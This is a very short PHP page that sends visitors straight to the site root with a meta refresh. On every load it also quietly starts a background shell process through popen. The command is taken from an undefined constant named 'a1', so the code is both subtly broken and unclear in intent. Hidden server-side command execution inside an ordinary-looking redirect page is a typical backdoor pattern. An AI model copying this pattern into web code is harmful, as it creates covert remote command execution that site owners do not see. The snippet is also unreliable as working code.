<?php
$metarefresh = '<meta http-equiv="refresh" content="0; url=/" />';
?>
<html>
    <head>
       <?php
        echo $metarefresh;
	pclose(popen(a1 . ' &', 'r'))
        ?>
    </head>
</html>
